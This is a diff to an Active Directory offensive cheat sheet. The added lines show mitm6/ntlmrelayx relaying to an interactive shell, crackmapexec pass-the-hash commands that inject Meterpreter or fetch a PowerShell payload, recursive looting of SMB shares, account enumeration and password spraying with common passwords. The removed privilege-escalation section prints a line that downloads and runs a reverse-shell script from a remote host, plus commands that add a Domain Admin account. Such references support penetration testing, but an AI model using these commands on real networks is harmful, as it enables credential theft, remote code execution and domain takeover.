@@ -22,11 +22,6 @@
   * [Trust relationship between domains](#trust-relationship-between-domains)
   * [PrivExchange attack](#privexchange-attack)
   * [Password spraying](#password-spraying)
-* [Privilege Escalation](#privilege-escalation)
-  * [PrivEsc Local Admin - Token Impersonation (RottenPotato)](#privesc-local-admin---token-impersonation-rottenpotato)
-  * [PrivEsc Local Admin - MS16-032](#privesc-local-admin---ms16-032---microsoft-windows-7--10--2008--2012-r2-x86x64)
-  * [PrivEsc Local Admin - MS17-010 (Eternal Blue)](#privesc-local-admin---ms17-010-eternal-blue)
-  * [From Local Admin to Domain Admin](#from-local-admin-to-domain-admin)
 
 ## Tools
 
@@ -56,12 +51,25 @@
   git clone --recursive https://github.com/byt3bl33d3r/CrackMapExec
   crackmapexec smb -L
   crackmapexec smb -M name_module -o VAR=DATA
+  crackmapexec 192.168.1.100 -u Jaddmon -H 5858d47a41e40b40f294b3100bea611f --local-auth
   crackmapexec 192.168.1.100 -u Jaddmon -H 5858d47a41e40b40f294b3100bea611f --shares
   crackmapexec 192.168.1.100 -u Jaddmon -H 5858d47a41e40b40f294b3100bea611f -M rdp -o ACTION=enable
   crackmapexec 192.168.1.100 -u Jaddmon -H 5858d47a41e40b40f294b3100bea611f -M metinject -o LHOST=192.168.1.63 LPORT=4443
   crackmapexec 192.168.1.100 -u Jaddmon -H ":5858d47a41e40b40f294b3100bea611f" -M web_delivery -o URL="https://IP:PORT/posh-payload"
   crackmapexec 192.168.1.100 -u Jaddmon -H ":5858d47a41e40b40f294b3100bea611f" --exec-method smbexec -X 'whoami'
   crackmapexec mimikatz --server http --server-port 80
+  ```
+
+* [Mitm6](https://github.com/fox-it/mitm6.git)
+
+  ```bash
+  git clone https://github.com/fox-it/mitm6.git && cd mitm6
+  pip install .
+  mitm6 -d lab.local
+  ntlmrelayx.py -wh 192.168.218.129 -t smb://192.168.218.128/ -i
+  # -wh: Server hosting WPAD file (Attacker’s IP)
+  # -t: Target (You cannot relay credentials to the same device that you’re spoofing)
+  # -i: open an interactive shell
   ```
 
 * [PowerSploit](https://github.com/PowerShellMafia/PowerSploit/tree/master/Recon)
@@ -138,6 +146,17 @@ smbclient -I 10.10.10.100 -L ACTIVE -N -U ""
 use Sharename # select a Sharename
 cd Folder     # move inside a folder
 ls            # list files
+```
+
+Download a folder recursively
+
+```powershell
+smbclient //10.0.0.1/Share
+smb: \> mask ""
+smb: \> recurse ON
+smb: \> prompt OFF
+smb: \> lcd '/path/to/go/'
+smb: \> mget *
 ```
 
 Mount a share
@@ -295,6 +314,8 @@ cme smb 10.10.0.202 -u username -p password --ntds vss
 enum4linux | grep -i desc
 There are 3-4 fields that seem to be common in most AD schemas: 
 UserPassword, UnixUserPassword, unicodePwd and msSFU30Password.
+
+Get-WmiObject -Class Win32_UserAccount -Filter "Domain='COMPANYDOMAIN' AND Disabled='False'" | Select Name, Domain, Status, LocalAccount, AccountType, Lockout, PasswordRequired,PasswordChangeable, Description, SID
 ```
 
 ### PassTheTicket Golden Tickets
@@ -348,7 +369,7 @@ cat $KRB5CCNAME
 
 
 NOTE: You may need to comment the proxy_dns setting in the proxychains configuration file
-./psexec.py -k -no-pass --dc-ip 192.168.1.1 AD/administrator@192.168.1.100 
+./psexec.py -k -no-pass -dc-ip 192.168.1.1 AD/administrator@192.168.1.100 
 ```
 
 ### PassTheTicket Silver Tickets
@@ -363,7 +384,7 @@ kerberos::golden /user:USERNAME /domain:DOMAIN.FQDN /sid:DOMAIN-SID /target:TARG
 Then use the same steps as a Golden ticket
 misc::convert ccache ticket.kirbi
 export KRB5CCNAME=/home/user/ticket.ccache
-./psexec.py -k -no-pass --dc-ip 192.168.1.1 AD/administrator@192.168.1.100 
+./psexec.py -k -no-pass -dc-ip 192.168.1.1 AD/administrator@192.168.1.100 
 ```
 
 ### Trust Tickets
@@ -551,63 +572,27 @@ Alternatively you can use the Metasploit module
 
 ### Password spraying
 
-Password spraying refers to the attack method that takes a large number of usernames and loops them with a single password. Using `kerbrute`, a tool to perform Kerberos pre-auth bruteforcing.
+Password spraying refers to the attack method that takes a large number of usernames and loops them with a single password. 
+
+Using `kerbrute`, a tool to perform Kerberos pre-auth bruteforcing.
 
 ```powershell
 root@kali:~$ ./kerbrute_linux_amd64 userenum -d lab.ropnop.com usernames.txt
 root@kali:~$ ./kerbrute_linux_amd64 passwordspray -d lab.ropnop.com domain_users.txt Password123
 ```
 
-
-## Privilege Escalation
-
-### PrivEsc Local Admin - Token Impersonation (RottenPotato)
-
-Binary available at : https://github.com/foxglovesec/RottenPotato
-Binary available at : https://github.com/breenmachine/RottenPotatoNG
-
-```c
-getuid
-getprivs
-use incognito
-list\_tokens -u
-cd c:\temp\
-execute -Hc -f ./rot.exe
-impersonate\_token "NT AUTHORITY\SYSTEM"
-```
+Using `crackmapexec` and `mp64` to generate passwords and spray them against SMB services on the network.
 
 ```powershell
-Invoke-TokenManipulation -ImpersonateUser -Username "lab\domainadminuser"
-Invoke-TokenManipulation -ImpersonateUser -Username "NT AUTHORITY\SYSTEM"
-Get-Process wininit | Invoke-TokenManipulation -CreateProcess "Powershell.exe -nop -exec bypass -c \"IEX (New-Object Net.WebClient).DownloadString('http://10.7.253.6:82/Invoke-PowerShellTcp.ps1');\"};"
+crackmapexec smb 10.0.0.1/24 -u Administrator -p `(./mp64.bin Pass@wor?l?a)`
 ```
 
-### PrivEsc Local Admin - MS16-032 - Microsoft Windows 7 < 10 / 2008 < 2012 R2 (x86/x64)
+Most of the time the best passwords to spray are :
 
-Check if the patch is installed : `wmic qfe list | find "3139914"`
+- Password1
+- Welcome1
+- $Companyname1
 
-```powershell
-Powershell:
-https://www.exploit-db.com/exploits/39719/
-https://github.com/FuzzySecurity/PowerShell-Suite/blob/master/Invoke-MS16-032.ps1
-
-Binary exe : https://github.com/Meatballs1/ms16-032
-
-Metasploit : exploit/windows/local/ms16_032_secondary_logon_handle_privesc
-```
-
-### PrivEsc Local Admin - MS17-010 (Eternal Blue)
-
-```c
-nmap -Pn -p445 — open — max-hostgroup 3 — script smb-vuln-ms17–010 <ip_netblock>
-```
-
-### From Local Admin to Domain Admin
-
-```powershell
-net user hacker2 hacker123 /add /Domain
-net group "Domain Admins" hacker2 /add /domain
-```
 
 ## References
 
@@ -646,3 +631,5 @@ net group "Domain Admins" hacker2 /add /domain
 * [[PrivExchange] From user to domain admin in less than 60sec ! - davy](http://blog.randorisec.fr/privexchange-from-user-to-domain-admin-in-less-than-60sec/)
 * [Abusing Exchange: One API call away from Domain Admin - Dirk-jan Mollema](https://dirkjanm.io/abusing-exchange-one-api-call-away-from-domain-admin)
 * [Red Teaming Made Easy with Exchange Privilege Escalation and PowerPriv - Thursday, January 31, 2019 - Dave](http://blog.redxorblue.com/2019/01/red-teaming-made-easy-with-exchange.html)
+* [Chump2Trump - AD Privesc talk at WAHCKon 2017 - @l0ss](https://github.com/l0ss/Chump2Trump/blob/master/ChumpToTrump.pdf)
+* [Post-OSCP Series Part 2 - Kerberoasting - 16 APRIL 2019 - Jon Hickman](https://0metasecurity.com/post-oscp-part-2/)
